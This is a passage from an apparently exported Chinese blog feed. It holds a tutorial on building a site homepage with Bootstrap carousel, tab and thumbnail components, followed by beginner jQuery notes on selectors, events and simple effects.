               &lt;LI&gt;&lt;a href=&quot;会员注册页面URL&quot;  target=&quot;_top&quot;&gt;会员注册&lt;/a&gt;&lt;/LI&gt;
            &lt;/ul&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
</code></pre><p><strong>2.文章板块需要用到的BootStrap元素</strong></p>
<p>1.轮换图片插件（caoursel)——解决了展示图片时图片变形的问题。</p>
<p>2.标签页插件（tabs）——对插件的样式进行了美化，并增加了自动切换功能。</p>
<p>3.信息按钮（btn-info）组件——用它列出文章分类信息。</p>
<p><strong>3.图书板块需要用到的元素</strong></p>
<p>1.自己开发的Jquery Tab插件</p>
<p>2.缩略图(thumbnail)组件</p>
<p>3.分类标签(仿豆瓣)</p>
<p><strong>4.用户板块用到的BootStrap元素</strong></p>
<p>1.BootStrap原生tab</p>
<p>2.圆形图片（<code>image_circle</code>）</p>
<h1 id="文章板块的设计与实现"><a href="#文章板块的设计与实现" class="headerlink" title="文章板块的设计与实现"></a>文章板块的设计与实现</h1><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>怎样的布局才能让网站中的文章以较好的形式呈现在首页上呢？既要反应更新，又要有精华。由于文章板块在首页上处于最上面的部分，所以，考虑使用轮换图片插件来吸引眼球，并且还需要展示最新的文章和热门文章以及文章分类。划分如下：</p>
<ol>
<li>左部——轮换图片(carousel)和文章列表(tabs)部分，各占一半。</li>
<li>右部——文章分类部分。</li>
</ol>
<p>左边占据（8/12），右边占据（4/12）</p>
<p>布局代码如下：</p>
<pre><code>&lt;!--板块的左部，使用panel，占据8/12--&gt;
&lt;div class=&quot;panel panel-default col-md-8&quot;&gt;
      &lt;!--轮换图片（carousel）插件,占左部的一半--&gt;
      &lt;div class=&quot;col-md-6&quot;&gt;
          &lt;div  class=&quot;carousel slide&quot; &gt;
          &lt;/div&gt;
       &lt;/div&gt;
    &lt;!--文章tabs，占左部的一半--&gt;
      &lt;div class=&quot;noborder col-md-6&quot;&gt;
          &lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt;
          &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;!--板块的右部，使用普通的DIV，占据4/12--&gt;
&lt;div class=&quot;col-md-4&quot;&gt;
&lt;/div&gt;
</code></pre><h2 id="使用Carousel（轮换图片）插件"><a href="#使用Carousel（轮换图片）插件" class="headerlink" title="使用Carousel（轮换图片）插件"></a>使用Carousel（轮换图片）插件</h2><p>首页中使用Carousel插件往往能达到吸睛的目的，是用来展示图文内容的最佳手段。在页面中使用carsouel插件很容易，可以分为以下几个步骤：</p>
<p><strong>1.在DIV的class属性中加入carousel</strong></p>
<p>加入carousel后，该DIV就是一个轮换图片插件了</p>
<pre><code>&lt;div class=&quot;carousel slide&quot; data-ride=&quot;carousel&quot;&gt;

&lt;/div&gt;
</code></pre><p><strong>2.设置内容区（carsouel-inner）</strong></p>
<p>在上述DIV中加入新的DIV作为其主体内容，其<code>class=&quot;carsouel-inner&quot;</code>。</p>
<pre><code>&lt;div class=&quot;carousel-inner&quot; role=&quot;listbox&quot;&gt;

&lt;/div&gt;
</code></pre><p><strong>3.在内容区中放入要展示的元素（item）</strong></p>
<pre><code>&lt;div class=&quot;item active&quot;&gt;
      &lt;a href=&quot;包含图片文章路径&quot;&gt;
          &lt;img src=&quot;图片路径&quot; alt=&quot;图片信息&quot;/&gt;&lt;/a&gt;
          &lt;div class=&quot;carousel-caption&quot;&gt;
               &lt;h4 class=&quot;alpha&quot;&gt;
                   &lt;a style=&quot;color:white;&quot; href=&quot;包含图片文章路径&quot;&gt;图片标题&lt;/a&gt;
               &lt;/h4&gt;
              &lt;/div&gt;

      &lt;/div&gt;
      &lt;!--其他item--&gt;
</code></pre><p>可以看到在元素区中包含文章展示信息——文内图片+标题+指向文章的链接。</p>
<p><strong>4.按钮区（carousel-control）</strong></p>
<p>最后放入，“上一个”，“下一个”按钮（左右箭头），用于用户自主切换。</p>
<pre><code>&lt;a class=&quot;left carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;prev&quot;&gt;
    &lt;span class=&quot;glyphicon glyphicon-chevron-left&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;
    &lt;span class=&quot;sr-only&quot;&gt;Previous&lt;/span&gt;
&lt;/a&gt;
&lt;a class=&quot;right carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;next&quot;&gt;
&lt;span class=&quot;glyphicon glyphicon-chevron-right&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;sr-only&quot;&gt;Next&lt;/span&gt;
</code></pre><p><strong>图片变形</strong></p>
<p>运行右侧的代码中可以看出,当不同长宽比的图片试图占满元素(item)区时，图片发生了变形。</p>
<h2 id="解决展示时图片变形的问题"><a href="#解决展示时图片变形的问题" class="headerlink" title="解决展示时图片变形的问题"></a>解决展示时图片变形的问题</h2><p>运行上节的代码我们发现插件中的图片发生了变形，分析其原因为：轮换插件中的图片使用的文章中的第一张图片，图片的大小不一，而轮播插件的大小基本是固定的，所以展示的时候图片出现了变形。下面看看怎么解决这个问题：</p>
<p><strong>1.引入Jqthumb.js</strong></p>
<p>在BootStrap中我们找不到解决办法，所以我们需要借助其它工具。Jqthumb插件是专门用来为图片生成缩略图的，它可以从图片中的任何坐标点开始取指定大小的图片区域作为图片的缩略图。你可以点击 <code>https://github.com/pakcheong/jqthumb</code> 来下载它，并将其应用到项目中(假设在当前项目中，jqthumb.js放置在scripts文件夹中):</p>
<pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt;
</code></pre><p><strong>2.在图片加载(onload)的时候调用DrawImage()函数来生成缩略图</strong></p>
<p>DrawImage()函数正是基于jqthumb.js库的，注意该函数一定要写在轮换插件前，因为我们必须在图片加载前生成缩略图。DrawImage()函数代码如下：</p>
<pre><code>&lt;!--导入插件--&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
function DrawImage(hotimg)
{
    $(hotimg).jqthumb({
    classname      : &apos;jqthumb&apos;,
            width          : &apos;100%&apos;,//宽度
            height         : &apos;300px&apos;,//高度
            position       : { y: &apos;50%&apos;, x: &apos;50%&apos;},//从图片的中间开始产生缩略图
            zoom           : &apos;1&apos;,//缩放比例
            method         : &apos;auto&apos;,//提交方法，用于不同的浏览器环境，默认为‘auto’
    });
}
&lt;/script&gt;
</code></pre><p>在上述代码中，我们使用了jqthumb，并且传入了相关初始化参数。调用了该函数后，在图片加载的时候，就会按照上述参数产生图片的缩略图，从而解决图片变形问题。由于缩略图是从原始图片的正中间开始往两边取得，所以该缩略图包含了图片的主要内容。</p>
<h2 id="针对BootStrap-tab的二次开发"><a href="#针对BootStrap-tab的二次开发" class="headerlink" title="针对BootStrap tab的二次开发"></a>针对BootStrap tab的二次开发</h2><p><strong>为什么要进行二次开发</strong></p>
<p>在文章列表部分，我们使用了BootStrap的Tab插件。BootStrap中的tab控件是在一小块区域展示大量信息的首选。但是，它的样式比较单一。而在展示文章列表模块时，我希望它可以更美观，而且选项卡可以自动切换。</p>
<p><strong>使用Tab插件</strong></p>
<p>在页面中使用BootStrap的Tab插件的方法如下：</p>
<p><strong>1.在DIV加入role=”tabpanel”</strong></p>
<p>加入该属性值后，该DIV则变成了tab插件。</p>
<pre><code>&lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt;
&lt;/div&gt;
</code></pre><p><strong>2.使用列表制作切换标签</strong></p>
<p>列表项即为切换标签项。</p>
<pre><code>&lt;ul class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot; style=&quot;margin-top:0px;&quot; id=&quot;docTabs&quot;&gt;
&lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt;&lt;a href=&quot;#Section_new&quot;
aria-controls=&quot;home&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot;&gt; 最新&lt;/a&gt;&lt;/li&gt;
&lt;!--其余标签卡……--&gt;
&lt;/ul&gt;
</code></pre><p>代码中可以看出，在超级链接元素（a）中有指向该标签页内容的链接地址，如“最新”标签中，<code>href=&quot;#Section_new&quot;</code>,而这个地址一定要跟后面的标签内容页（tab-pane）的ID一一对应。</p>
<p><strong>3.标签内容页区域（tab-content）</strong></p>
<p>所有的标签内容页均放在这个区域。</p>
<pre><code>&lt;div class=&quot;tab-content&quot;&gt;
    &lt;!--最新--&gt;
    &lt;!--7天热门--&gt;
    &lt;!--30天热门--&gt;
&lt;/div&gt;
</code></pre><p><strong>4.单个标签页（tab-pane）</strong></p>
<p>tab插件的最小元素，具体的标签内容页。</p>
<pre><code>&lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade in active&quot; id=&quot;Section_new&quot;&gt;
    &lt;P&gt;
        tab中的内容
    &lt;/P&gt;
&lt;/div&gt;
&lt;!--其余标签页……--&gt;
</code></pre><h2 id="tab样式美化"><a href="#tab样式美化" class="headerlink" title="tab样式美化"></a>tab样式美化</h2><p>下面我们来美化一下tab的样式吧，通过CSS代码来设置tab插件的样式，这些样式会覆盖掉bootstrap中的原有样式达到美化tab的效果，主要包括:</p>
<ol>
<li>标签的形状和背景色</li>
<li>当前(被选中)标签的样式和背景色</li>
<li>标签内容页样式</li>
<li><p>与小屏幕兼容</p>
<p> //标签样式<br> .tab .nav-tabs {<br> ……//详见右侧代码<br> }<br> //标签链接样式<br> .tab .nav-tabs li a {<br> background: transparent;<br> ……//详见右侧代码<br> }<br> //当前选中标签样式<br> .tab .nav-tabs li.active a, .tab .nav-tabs li.active a i {<br> ……//详见右侧代码<br> }<br> //当前选中标签之后插入的样式<br> .tab .nav-tabs li.active a:after {<br> ……//详见右侧代码<br> }<br> //标签内容页样式<br> .tab .tab-content {<br> ……//详见右侧CSS代码<br> }<br> //在小屏幕中的样式<br> @media only screen and (max-width: 480px) {<br> ……//详见右侧代码<br> }</p>
</li>
</ol>
<h2 id="tabs自动切换功能的实现"><a href="#tabs自动切换功能的实现" class="headerlink" title="tabs自动切换功能的实现"></a>tabs自动切换功能的实现</h2><p>文章列表中列出的最新、7天热门、30天热门这三个选项卡每隔5秒钟自动切换，当鼠标悬停到某选项卡的时候，则暂停轮换，移开后，继续切换。代码设计思路如下：</p>
<ol>
<li>设置一个定时器timer()，每隔5秒钟对标签页进行切换一次。</li>
<li>在网页加载完以后就运行该定时器。</li>
<li>当用户鼠标悬停到某个标签页上时，清除该（clearInterval）定时器。</li>
<li><p>鼠标移开后，继续使用定时器。</p>
<p> //tabs自动轮换<br> function timer(i)<br> {</p>
<pre><code>interval=setInterval(function()
</code></pre><p> {</p>
<pre><code> $(&quot;#docTabs li:eq(&quot;+i+&quot;) a&quot;).tab(&apos;show&apos;);
 i++;
 if(i&gt;2)
 i=0;
}
</code></pre><p> ,5000);<br> return interval;<br> }<br> $(function(){<br> var i=0;<br> interval=timer(i);<br> //当鼠标悬停在列表区域时暂停轮换<br> $(“.tab-pane”).mouseover(function(){</p>
<pre><code>    clearInterval(interval);
});
</code></pre><p> //鼠标移开时继续轮换<br> $(“.tab-pane”).mouseout(function(){</p>
<pre><code>   timer(i);
});
</code></pre><p> });</p>
</li>
</ol>
<h2 id="分类展示"><a href="#分类展示" class="headerlink" title="分类展示"></a>分类展示</h2><p><strong>实现过程</strong></p>
<p>文章分类展示部分采用了BootStrap原生的信息按钮（btn-info）,当鼠标悬停时变色，点击则转向相应的二级页面，代码如下：</p>
<pre><code>&lt;div class=&quot;col-md-4&quot; style=&quot;float:right;&quot;&gt;
&lt;div&gt; 
    &lt;H5&gt;分 类&lt;/H5&gt;
    &lt;div style=&quot;font-size:14px;&quot; id=&quot;blogclas&quot;&gt;
        &lt;a style=&quot;margin-left:5px; margin-bottom:5px;&quot; class=&quot;btn btn-info col-md-3&quot; href=&quot;二级页面地址&quot; role=&quot;button&quot;&gt;分类名&lt;/a&gt;
           &lt;!--其他分类信息--&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt; 
</code></pre><p><strong>代码分析</strong></p>
<p>由代码可知，分类区域占有的宽度为（4/12）col-md-4，而其中的单个分类又占有其中的（3/12） col-md-3，也就是每4个分类占一行（实际上由于分类之间要有间隔，只能是3个分类占一行）。</p>
<h1 id="图书板块的设计与实现"><a href="#图书板块的设计与实现" class="headerlink" title="图书板块的设计与实现"></a>图书板块的设计与实现</h1><h2 id="布局-1"><a href="#布局-1" class="headerlink" title="布局"></a>布局</h2><p>图书板块的布局既要考虑到分类展示图书信息，还需要考虑与前面文章板块的对应，所以，图书板块也分为左右两部分，左边同样使用col-md-8,右边使用col-md-4来划分宽度。当然，如果在其它屏幕有不同的布局需求，你也可以添加上其他的属性值，如col-xs-6（在手机屏幕中占6/12）等。布局代码如下：</p>
<pre><code>&lt;div class=&quot;col-md-8&quot; id=&quot;indexbooks&quot;&gt;
首页图书展示区……
&lt;/div&gt;
&lt;div class=&quot;col-md-4&quot;&gt;
图书分类展示区……
&lt;/div&gt;
</code></pre><h2 id="开发Jquery-tab"><a href="#开发Jquery-tab" class="headerlink" title="开发Jquery tab"></a>开发Jquery tab</h2><p><strong>为什么要自己写tab</strong></p>
<p>为了更好的在首页图文并茂的展示图书信息以及按类别展示尽可能多的图书，我决定使用Jquery开发自己的tab。下面来看看我的实现过程。</p>
<p><strong>HTML部分</strong></p>
<p><strong>1.标签项</strong></p>
<p>标签仍然使用列表来完成，列表项即为标签项。</p>
<pre><code>&lt;ul id=&quot;booksfilter&quot; style=&quot;float:right;font-size:14px;&quot;&gt; 
    &lt;li&gt;&lt;a class=&quot;cur&quot; href=&quot;javascript:void(0);&quot;&gt;入门&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;实战&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;进阶&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><p>其中’a’标签的class=”cur”表示当前被选中的标签。后面再CSS中会设置它的样式。</p>
<p><strong>2.标签页内容区</strong></p>
<p>使用3个DIV,分别存放入门、实战和进阶的图书。</p>
<pre><code>&lt;div class=&quot;booklist&quot;&gt;
    入门级图书……
&lt;/div&gt;
&lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt;
    实战类图书……
&lt;/div&gt;
&lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt;
    进阶类图书……
&lt;/div&gt;
</code></pre><p>可以看到，初始时，只有第一个标签页的内容是显示的，而其它两个标签页内容是隐藏（<code>style=&quot;display:none;&quot;</code>）的,后面会利用Jquery来控制他们的切换。</p>
<p><strong>3.使用缩略图（thumbnail）组件展示图书信息</strong></p>
<p>在该组件中包含了图书封面、图书标题、和链接到该图书页面的超级链接。</p>
<pre><code>&lt;div class=&quot;thumbnail&quot; style=&quot;height:220px; border-width:0px;&quot;&gt;
  &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt;
                &lt;img style=&quot;height:130px;&quot; src=&quot;http://img3.doubanio.com/mpic/s1039608.jpg&quot;&gt;            
  &lt;/a&gt;
  &lt;div class=&quot;caption&quot;&gt;
    &lt;h5 style=&quot;text-align:center;&quot;&gt;
    &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt;
    LINUX权威指南（...        &lt;/a&gt;&lt;/h5&gt;
     &lt;p style=&quot;text-align:center;&quot;&gt;
    评论(0) &lt;span class=&quot;badge&quot;&gt;1推荐&lt;/span&gt;&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;
</code></pre><p>另外，每本图书所占的宽度为col-md-3,也就是每4本书占据一行。</p>
<h2 id="设计Tab的样式"><a href="#设计Tab的样式" class="headerlink" title="设计Tab的样式"></a>设计Tab的样式</h2><p>下面我们来设计他的CSS样式，让我们的tabs尽量美观。这些样式主要包括：</p>
<ol>
<li>标签项样式</li>
<li>标签项中链接的样式</li>
<li><p>当前被选中标签的样式（cur）</p>
<p> //选项卡列表样式<br> #booksfilter li<br> {</p>
<pre><code>padding:5px;//内边距 5px
list-style-type:none;
float:left;
padding:0px;
</code></pre><p> }<br> //设置‘|’的左右边距<br> #booksfilter span<br> {</p>
<pre><code>margin-left:5px;
margin-right:5px;
</code></pre><p> }</p>
<p> //选项卡链接的样式<br> #booksfilter a<br> {</p>
<pre><code>padding:5px;//内边距：5px
text-decoration:none;//无下划线
</code></pre><p> }<br> //选项卡被选中或当鼠标移动到选项卡时的样式<br> #booksfilter a.cur,#booksfilter a:hover<br> {</p>
<pre><code>background-color:#e67e22;//背景色
color:white;//前景色
border-radius:5px;//圆角
</code></pre><p> }</p>
</li>
</ol>
<p>代码注释已经很详细了，当然大家也可以修改它来设计出更美的样式。</p>
<h2 id="实现Tab的行为"><a href="#实现Tab的行为" class="headerlink" title="实现Tab的行为"></a>实现Tab的行为</h2><p>当标签项点击切换的时候，这部分的交互就要交给Jquery代码来完成了。 代码设计思路如下：</p>
<p><strong>遍历所有的标签页，为每个标签页添加点击(click)事件的处理函数</strong></p>
<p>在该处理函数，高亮（使用Jquery在该标签项的class中添加cur）显示当前标签项和其对应的标签页，隐藏其它。</p>
<pre><code>$(function()
        {
    $(&apos;#booksfilter a&apos;).each(function(i)
    {//对每个tabs中的标签添加点击（click）事件的处理函数

        $(this).click(function(){
            $(this).addClass(&apos;cur&apos;);
            $(this).parent().siblings().find(&apos;a&apos;).removeClass(&apos;cur&apos;);//删除其他任何选项的cur类
            $(&apos;.booklist&apos;).eq(i).show();//显示本节点
            $(&apos;.booklist&apos;).eq(i).siblings().hide();//隐藏兄弟节点
        })

    });

        });
</code></pre><p>在右侧具体代码中，为了适应屏幕大小，将col-md-3改为了col-xs-3,如果你想使用这个插件的话在你的项目中记得改回去:)。另外，js代码直接放在了HTML的尾部。</p>
<h2 id="仿豆瓣分类标签的实现"><a href="#仿豆瓣分类标签的实现" class="headerlink" title="仿豆瓣分类标签的实现"></a>仿豆瓣分类标签的实现</h2><p>为了和文章分类部分的样式进行区分，我决定自己动手写一个具有其他样式的分类标签集。刚好看到豆瓣读书板块的首页中的图书分类标签还不错，于是决定自己写一个类似的样式。首先是HTML代码部分：</p>
<pre><code>&lt;div class=&quot;col-md-4&quot;&gt;
&lt;h5 style=&quot;margin-top:0px;&quot;&gt;
     图书分类
&lt;/h5&gt;
&lt;div class=&quot;row&quot; id=&quot;bookclass&quot;&gt;
    &lt;a href=&quot;图书分类页面&quot; class=&quot;col-md-3&quot;&gt;分类名&lt;/a&gt;
    &lt;!--其他分类--&gt;
&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>可以看到图书分类标签很简单——直接使用’a’标签作为分类标签，下面只要针对它写CSS样式就可以了。</p>
<pre><code>//a标签样式
#bookclass a
{
    display:block;//区块显示
    background-color:#f5f5f5;//背景色（跟豆瓣相同）
    text-align:center;//文字居中
    padding:2px 5px;//内边距，上下2px，左右5px
    float:left;//左浮动，从而可以实现水平排列
    margin:2px 2px;//外边距，上下2px,左右2px
}
//当鼠标悬停时改变背景色
#bookclass a:hover
{
    background-color:#e8e8e8;//同豆瓣颜色
}
</code></pre><h1 id="用户板块的设计与实现"><a href="#用户板块的设计与实现" class="headerlink" title="用户板块的设计与实现"></a>用户板块的设计与实现</h1><h2 id="布局-2"><a href="#布局-2" class="headerlink" title="布局"></a>布局</h2><p>由于项目开发时间仓促，用户板块没有加入特别的样式美化和行为，而是使用了原生tab。在用户板块中，主要展示最新加入的用户和为博客社区做出最多贡献的用户（高分用户）。布局比较简单，采用整块布局，利用它来展示用户信息。布局主要代码如下：</p>
<pre><code>&lt;div class=&quot;panel panel-default&quot;&gt;
&lt;!--用户展示区--&gt;
&lt;/div&gt;
</code></pre><h2 id="用户板块的实现"><a href="#用户板块的实现" class="headerlink" title="用户板块的实现"></a>用户板块的实现</h2><p><strong>用到的BootStrap元素</strong></p>
<p>在用户板块主要用到的BootStrap元素如下：</p>
<ol>
<li>Bootstrap tab——以标签页的方式展示新会员和高分会员</li>
<li>圆形图片区（img-circle）——用于展示用户的头像。</li>
</ol>
<p><strong>实现过程</strong></p>
<p>用户板块主要使用了BootStrap tab,前面的章节已经介绍过其使用方法。主要包括：</p>
<p><strong>1.在DIV中加入role=”tabpanel”，该DIV则会成为tab</strong></p>
<pre><code>&lt;div role=&quot;tabpanel&quot;&gt;
&lt;/div&gt;
</code></pre><p><strong>2.使用列表来制作标签页</strong></p>
<pre><code>&lt;ul id=&quot;myTabregister&quot; class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot;&gt;
      &lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt;
         &lt;a href=&quot;#newRegister&quot; id=&quot;home-tab&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;home&quot; aria-expanded=&quot;true&quot;&gt;新会员&lt;/a&gt;         
     &lt;/li&gt;
      &lt;li role=&quot;presentation&quot; class=&quot;&quot;&gt;
          &lt;a href=&quot;#highScoreRegister&quot; role=&quot;tab&quot; id=&quot;profile-tab&quot; data-toggle=&quot;tab&quot; aria-controls=&quot;profile&quot; aria-expanded=&quot;false&quot;&gt;高分会员&lt;/a&gt;
     &lt;/li&gt;

&lt;/ul&gt;
</code></pre><p>同样，列表中，超级链接的地址href的值和单个标签内容页的id值一一对应，如最新会员标签项的<code>href=&quot;newRegister&quot;</code>。</p>
<p><strong>3.标签内容区域（tab-content）</strong></p>
<pre><code>&lt;div id=&quot;myTabContent&quot; class=&quot;tab-content&quot; style=&quot;text-align:center;&quot;&gt;
    &lt;!--最新会员展示区--&gt;
    &lt;!--高分会员展示区--&gt;
&lt;/div&gt;
</code></pre><p><strong>4.单个标签页(tabpanel)</strong></p>
<pre><code>&lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade active in&quot; id=&quot;newRegister&quot; aria-labelledby=&quot;home-tab&quot;&gt;
                    &lt;div class=&quot;row&quot; style=&quot;margin-top:10px;&quot;&gt;
                        &lt;div class=&quot;col-md-2&quot; style=&quot;height:200px;&quot;&gt;
                            &lt;a href=&quot;会员主页&quot;&gt;
                                &lt;img class=&quot;img-circle&quot; src=&quot;图片路径&quot;style=&quot;width:80px; height: 80px;&quot; &gt;
                            &lt;/a&gt;
                        &lt;/div&gt;
                        &lt;!--其他最新会员……--&gt;
                  &lt;/div&gt;
                  &lt;!--高分会员--&gt;
</code></pre><p>该示例代码中主要列出了“最新会员”的展示信息，其ID为newRegister,与其标签项的链接地址相同。其中每个会员信息占有的屏幕宽度为col-md-2(在右侧代码中为了满足屏幕尺寸需要改为col-xs-2),也就是每6个用户占据一行。</p>
<p>本课程内容转自：<a href="http://hubwiz.com/" target="_blank" rel="external">汇智网</a></p>
]]></content>
      
        
        <tags>
            
            <tag> BootStrap </tag>
            
            <tag> 前端 </tag>
            
            <tag> 编程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JQuery学习笔记]]></title>
      <url>/2016/08/28/JQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><strong>JQuery是什么？</strong></p>
<p>Jquery是一个基于javascript的框架，等于说把javascript封装了一下。需要在html中链接了JQuery的文件才能用，你查看源代码，就能看到链接Jquery的代码：</p>
<pre><code>&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot; src=&quot;https://www.xxx/js/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt;
</code></pre><a id="more"></a>
<p><strong>学JQuery跟学javascript有什么区别，是不是要精通javascript才能学JQuery?</strong></p>
<p> jquery是基于javascript，所以可以说写jquery脚本有一半是在写javascript，但jquery又有很多特性是它独有的。jquery是封装了javascript，是为了简化javascript脚本而存在，所以没必要精通javascript，javascript中很多的函数在jquery中都有更简单的替代方式。</p>
<p><strong>开始入门吧</strong></p>
<p>入门之前，先简单地看一下html+css+javascript的语法，再来看这篇文章，这会让你更好地理解代码。Jquery最大的特点是方便对DOM的封装。什么是DOM？DOM就是操作html文件的树结构的方法，我们看图片。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery1.gif" alt=""></p>
<p>从这个图很明显的就能看出，实际上html文件中每一个标签都是一个节点，整个html文档组成了一棵树。</p>
<p>在javascript中，我们有一些函数可以访问这些节点，并对他们进行增加、删除、修改。比如，getElementById(xxx)就是获得id为xxx的对象，它可能就是一个div标签。我们用面向对象的思想来看，实际上获得的是一个id为xxx的div对象。这个对象实际上就是从<code>&lt;div id=xxx&gt;</code>到相应<code>&lt;/div&gt;</code>这所有的内容。</p>
<p>通过这个对象的相关方法就能很方便地直接操作html文件。</p>
<p>在Jquery中，DOM变得更加简单。</p>
<p><strong>选择器</strong></p>
<p>要操作html文档，就用到选择器。</p>
<p>举个很简单的例子，$(“div#exm”) 选择了id为exm的div元素。如下代码能让“测试1”这三个字通过点击按钮显示在html中：</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(&quot;button&quot;).click(function(){
    $(&quot;div#test&quot;).html(&quot;测试1&quot;);
});
});
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;button type=&quot;button&quot;&gt;点击我&lt;/button&gt;
&lt;div id=&quot;test&quot;&gt;&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>大家可以把代码放进<code>http://www.w3school.com.cn/tiy/t.asp?f=html_basic</code>运行，查看效果。</p>
<p>来分析一下这一小段Jquery代码。首先，$(document)，这个选择器选择的是整个文档。ready是一个事件，表示等整个文档加载完成后再运行这段javascript。一般Jquery的代码都放在这个块里面。$(“botton”)选择了文档中第一个<botton>，也就是按钮。click也是一个事件，表示当该按钮被点击后执行这里面的代码。$(“div#test”)就是选择的id=test的<div>元素，对该元素执行方法html()，html方法就是读取或修改<div></div>中的内容。（具体是读取还是修改要看具体情况，在我这里就是修改）</div></botton></p>
<p>所以，点击了按钮后，<code>&lt;div id=&quot;exm&quot;&gt;&lt;/div&gt;</code>中就被加入了“测试1”三个字。</p>
<p>到此为止，我们一共接触到如下几个概念：</p>
<pre><code>选择器：$(xxx)

事件：ready()、click()

文档操作方法：html()
</code></pre><p>大家应该就了解个大概了。通过Jquery，我们就可以操作html中任何标签内的任何内容。我来列举几个。</p>
<p><strong>修改css</strong></p>
<p>通过css方法可以操作css。比如如下代码：</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(&quot;button&quot;).click(function(){
$(&quot;div#test&quot;).css(&quot;color&quot;, &quot;red&quot;);
});
});
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt;
&lt;div id=&quot;test&quot;&gt;测试2&lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>将刚才的代码改了一点，看这句话：$(“div#exm”).css(“color”, “red”); 将id=test的div元素的css样式color值改成red。我们点击了按钮后就能看到，“测试2”三个字变成了红色。</p>
<p><strong>隐藏和显示和动画效果</strong></p>
<p>Jquery自带了一些动画效果，通过一些参数就能显示出来。看如下代码</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(&quot;button&quot;).click(function(){
    $(&quot;div#test&quot;).hide(&apos;slow&apos;);
});
});
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;button type=&quot;button&quot;&gt;Click me&lt;/button&gt;
&lt;div id=&quot;test&quot;&gt;测试3&lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>点击了按钮后，“测试3”这三个字慢慢滑动离开了，很像幻灯片是吧？我也只是改了一句话：$(“div#exm”).hide(‘slow’); 将id=test的div元素隐藏，并且是慢慢隐藏，因为有’slow’参数。</p>
<p>hide方法就是隐藏一个元素所有内容的方法。它有一个参数，表示隐藏的快慢。</p>
<p>当然有hide方法就有show方法，用法一样。还有一个方法toggle，表示在隐藏和显示中切换。有这三个方法，我们很容易弹出一个菜单或让一个不要的内容消失，而且有动画效果。</p>
<p>当然，Jquery还支持更多动画效果，有很多方法，大家可以自己去探索。</p>
<p><strong>改变元素大小</strong></p>
<p>我们可以用Jquery的height()和width()方法改变一个元素的大小。这个工作也可以用css()方法完成。通过这个方法，我们可以动态改变我们网站的元素，来适应用户浏览器的分辨率。</p>
<p><strong>更多事件：文本框获得、失去焦点</strong></p>
<p>在很多网站填写表单的地方都用到了这个效果：</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(&quot;:text&quot;).focus(function(){
$(&quot;:text&quot;).val(&quot;&quot;);
});
});
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;input type=&quot;text&quot; value=&quot;请填写用户名&quot; style=&quot;color: #999;&quot;/&gt;
&lt;/body&gt;

&lt;/html&gt;
